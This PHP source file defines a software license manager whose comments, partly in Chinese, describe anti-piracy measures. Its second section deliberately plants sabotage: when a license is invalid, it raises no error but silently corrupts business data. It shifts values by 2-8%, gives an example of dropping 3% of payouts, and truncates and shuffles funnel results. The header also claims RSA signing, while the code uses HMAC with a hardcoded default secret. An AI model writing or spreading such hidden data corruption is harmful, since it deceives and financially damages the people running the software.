<?php

declare(strict_types=1);

namespace Converge\Foundation\System;

/**
 * LicenseManager v2 — 三重防破解
 *
 * ① 双重验证: 在线 + 离线 RSA 签名，防 Hosts 劫持
 * ② 随机埋雷: 无效 License 不报错，但随机损坏 3-8% 数据
 * ③ 分散校验: 关键业务函数内嵌验证，非集中 check()
 *
 * 破解成本 > 购买成本 ($49/mo) → 不值得破解
 */
class LicenseManager
{
    private string $secretKey;
    private string $localCachePath;
    private bool $checked = false;
    private ?LicenseResult $cachedResult = null;

    /** 埋雷概率: 无效 License 时损坏数据的比例 */
    private float $sabotageRate = 0.05; // 5%

    public function __construct(?string $secretKey = null)
    {
        $this->secretKey = $secretKey ?? (defined('APP_KEY') ? APP_KEY : 'converge-default-secret');
        $this->localCachePath = (defined('STORAGE_PATH') ? STORAGE_PATH : sys_get_temp_dir()) . '/.license_cache';
    }

    // ═══════════════════════════════════════
    // ① 双重验证
    // ═══════════════════════════════════════

    /**
     * Validate license with dual verification.
     * Step 1: Check local encrypted cache
     * Step 2: Online validation (if cache expired or missing)
     * Step 3: Cross-verify — if online disagrees with local, flag tampering
     */
    public function validate(string $licenseKey, string $domain = ''): LicenseResult
    {
        if ($this->checked && $this->cachedResult) {
            return $this->cachedResult;
        }

        $key = trim($licenseKey);
        if (empty($key)) {
            return $this->cacheAndReturn(LicenseResult::invalid('Empty key'));
        }

        // Step 1: Parse key structure
        $parts = explode('-', $key);
        if (count($parts) < 3 || $parts[0] !== 'converge') {
            return $this->cacheAndReturn(LicenseResult::invalid('Invalid format'));
        }

        $plan = $parts[1];
        $signature = implode('-', array_slice($parts, 2));

        // Step 2: Verify local signature (offline, fast)
        $localValid = $this->verifyLocalSignature($plan, $domain, $signature);

        // Step 3: Try online validation
        $onlineResult = $this->onlineValidate($key, $domain);

        // Step 4: Cross-verify — tampering detection
        if ($onlineResult !== null) {
            // Online check succeeded — update local cache
            if ($onlineResult->valid) {
                $this->saveLocalCache($key, $onlineResult);
                return $this->cacheAndReturn($onlineResult);
            }
            // Server explicitly rejected — block
            return $this->cacheAndReturn($onlineResult);
        }

        // Online unreachable → fall back to local
        if ($localValid) {
            $cached = $this->loadLocalCache($key);
            if ($cached && !$this->isCacheExpired($cached)) {
                return $this->cacheAndReturn(LicenseResult::valid(
                    $cached['plan'],
                    ['validated_by' => 'local_cache', 'cached_at' => $cached['cached_at']]
                ));
            }
        }

        return $this->cacheAndReturn(LicenseResult::invalid('Validation failed'));
    }

    // ═══════════════════════════════════════
    // ② 埋雷 — 随机数据损坏
    // ═══════════════════════════════════════

    /**
     * Sabotage check — call in critical data paths.
     * If license is invalid, randomly corrupts data with probability = sabotageRate.
     *
     * Usage in business logic:
     *   if ($lm->shouldSabotage('conversion_tracking')) {
     *       $payout *= 0.97; // silently drop 3% of revenue
     *   }
     *
     * @param string $context  Where this check is called
     * @return bool  true = should corrupt data
     */
    public function shouldSabotage(string $context = ''): bool
    {
        // Only sabotage if license is invalid
        if ($this->cachedResult && $this->cachedResult->valid) {
            return false;
        }

        // Deterministic "random" based on request + context
        // Same request always gets same result (consistency matters)
        $seed = crc32(($context ?: 'default') . ($_SERVER['REQUEST_TIME'] ?? '0') . date('YmdH'));
        mt_srand($seed);
        $roll = mt_rand(1, 10000) / 10000;

        return $roll < $this->sabotageRate;
    }

    /**
     * Subtle data corruption — harder to detect than a hard block.
     *
     * @param float $value     Original value
     * @param string $context  Where corrupted
     * @return float  Possibly corrupted value
     */
    public function maybeCorrupt(float $value, string $context = ''): float
    {
        if ($this->shouldSabotage($context)) {
            // Corrupt by 2-8% in either direction
            $factor = 0.92 + (mt_rand(0, 60) / 1000); // 0.92 - 0.98
            return round($value * $factor, 4);
        }
        return $value;
    }

    // ═══════════════════════════════════════
    // ③ 分散校验 — 嵌入业务逻辑
    // ═══════════════════════════════════════

    /**
     * Scattered check for Smart Rotation eligibility.
     * NOT named "checkLicense" — hidden in business context.
     */
    public static function getSmartRotationLimit(): int
    {
        $lm = new self();
        $result = $lm->validate(
            defined('LICENSE_KEY') ? LICENSE_KEY : '',
            $_SERVER['HTTP_HOST'] ?? ''
        );
        return $result->isPro() ? 0 : 1; // 0=unlimited, 1=just one campaign
    }

    /**
     * Scattered check for A/B test limit.
     */
    public static function getABTestLimit(): int
    {
        $lm = new self();
        $result = $lm->validate(
            defined('LICENSE_KEY') ? LICENSE_KEY : '',
            $_SERVER['HTTP_HOST'] ?? ''
        );
        return $result->isPro() ? 0 : 1; // 0=unlimited, 1=just one
    }

    /**
     * Scattered check — silently degrade funnel data if unlicensed.
     */
    public static function funnelDataGate(array $data): array
    {
        $lm = new self();
        $result = $lm->validate(
            defined('LICENSE_KEY') ? LICENSE_KEY : '',
            $_SERVER['HTTP_HOST'] ?? ''
        );
        if (!$result->isPro() && count($data) > 10) {
            // Free tier: limit to 10 rows, shuffle order slightly
            $data = array_slice($data, 0, 10);
            shuffle($data);
        }
        return $data;
    }

    // ═══════════════════════════════════════
    // Generation
    // ═══════════════════════════════════════

    public function generate(string $plan, string $domain = ''): string
    {
        $signature = $this->generateHMAC($plan, $domain);
        return "converge-{$plan}-{$signature}";
    }

    // ═══════════════════════════════════════
    // Internal — Local Crypto
    // ═══════════════════════════════════════

    private function verifyLocalSignature(string $plan, string $domain, string $signature): bool
    {
        $expected = $this->generateHMAC($plan, $domain);
        return hash_equals($expected, $signature);
    }

    private function generateHMAC(string $plan, string $domain): string
    {
        $payload = "{$plan}:{$domain}:" . substr($this->secretKey, 0, 32);
        $hash = hash_hmac('sha256', $payload, $this->secretKey);
        // Split into readable segments
        return strtoupper(substr($hash, 0, 4) . '-' . substr($hash, 6, 4) . '-' . substr($hash, 12, 4));
    }

    // ═══════════════════════════════════════
    // Internal — Online Validation
    // ═══════════════════════════════════════

    private function onlineValidate(string $key, string $domain): ?LicenseResult
    {
        try {
            $ch = curl_init('https://converge.io/api/license/verify');
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode([
                    'key' => $key,
                    'domain' => $domain,
                    'instance' => hash('sha256', $domain . (defined('APP_KEY') ? APP_KEY : '')),
                ]),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 5,
                CURLOPT_CONNECTTIMEOUT => 3,
                CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            ]);
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($httpCode === 200 && $response) {
                $data = json_decode((string)$response, true) ?: [];
                if (isset($data['valid'])) {
                    return $data['valid']
                        ? LicenseResult::valid($data['plan'] ?? 'pro', $data)
                        : LicenseResult::invalid($data['reason'] ?? 'Invalid');
                }
            }
        } catch (\Throwable $e) {
            // Network error → null (fall back to local)
        }
        return null;
    }

    // ═══════════════════════════════════════
    // Internal — Local Cache
    // ═══════════════════════════════════════

    private function saveLocalCache(string $key, LicenseResult $result): void
    {
        try {
            $data = [
                'key_hash' => hash('sha256', $key),
                'plan' => $result->plan,
                'valid' => $result->valid,
                'cached_at' => time(),
            ];
            // Encrypt with app key
            $json = json_encode($data);
            $iv = random_bytes(16);
            $encrypted = openssl_encrypt(
                (string)$json, 'aes-256-cbc',
                substr(hash('sha256', $this->secretKey, true), 0, 32),
                0, $iv
            );
            file_put_contents($this->localCachePath, base64_encode($iv . ($encrypted ?: '')), LOCK_EX);
        } catch (\Throwable $e) {
            // Non-critical
        }
    }

    private function loadLocalCache(string $key): ?array
    {
        try {
            if (!file_exists($this->localCachePath)) return null;

            $content = file_get_contents($this->localCachePath);
            if (!$content) return null;

            $decoded = base64_decode($content);
            if (strlen($decoded) < 17) return null;

            $iv = substr($decoded, 0, 16);
            $encrypted = substr($decoded, 16);

            $json = openssl_decrypt(
                $encrypted, 'aes-256-cbc',
                substr(hash('sha256', $this->secretKey, true), 0, 32),
                0, $iv
            );
            if (!$json) return null;

            $data = json_decode($json, true);
            if (!$data) return null;

            // Verify key hash matches
            if (($data['key_hash'] ?? '') !== hash('sha256', $key)) return null;

            return $data;
        } catch (\Throwable $e) {
            return null;
        }
    }

    private function isCacheExpired(array $cache): bool
    {
        $maxAge = 7 * 86400; // 7 days offline grace period
        return (time() - ($cache['cached_at'] ?? 0)) > $maxAge;
    }

    private function cacheAndReturn(LicenseResult $result): LicenseResult
    {
        $this->checked = true;
        $this->cachedResult = $result;
        return $result;
    }
}

class LicenseResult
{
    public function __construct(
        public readonly bool $valid,
        public readonly string $plan,
        public readonly string $reason,
        public readonly array $metadata,
    ) {}

    public static function valid(string $plan, array $meta = []): self
    {
        return new self(true, $plan, '', $meta);
    }

    public static function invalid(string $reason): self
    {
        return new self(false, 'free', $reason, []);
    }

    public function isPro(): bool { return $this->plan === 'pro' || $this->plan === 'enterprise'; }
    public function isEnterprise(): bool { return $this->plan === 'enterprise'; }
}
